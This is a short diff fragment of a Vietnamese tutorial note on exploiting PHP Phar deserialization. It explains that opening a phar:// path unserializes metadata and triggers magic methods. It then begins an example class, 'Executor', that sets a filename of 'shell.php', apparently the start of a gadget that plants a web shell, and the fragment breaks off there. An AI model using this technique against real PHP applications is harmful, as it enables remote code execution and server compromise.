@@ -9,7 +9,7 @@ Nôm na thì **Phar (PHP Archive)** nó là 1 định dạng tệp kiểu .zip,.
 ## Hướng khai thác
 - Vấn đề nó sẽ nằm ở việc khi một Phar phar://hehe.phar được thực thi, *Serialized* metadata sẽ *unserialized* :open_mouth:. Điều này có nghĩa ta có thể chèn metadata nguyên mẫu và thực thi các magic method (mặc dù đéo biết tại sao nó bị unserialized :))).
 - Ví dụ nhé:
-- '<?php
+'<?php
 
 class Executor{
     private $filename = "shell.php";
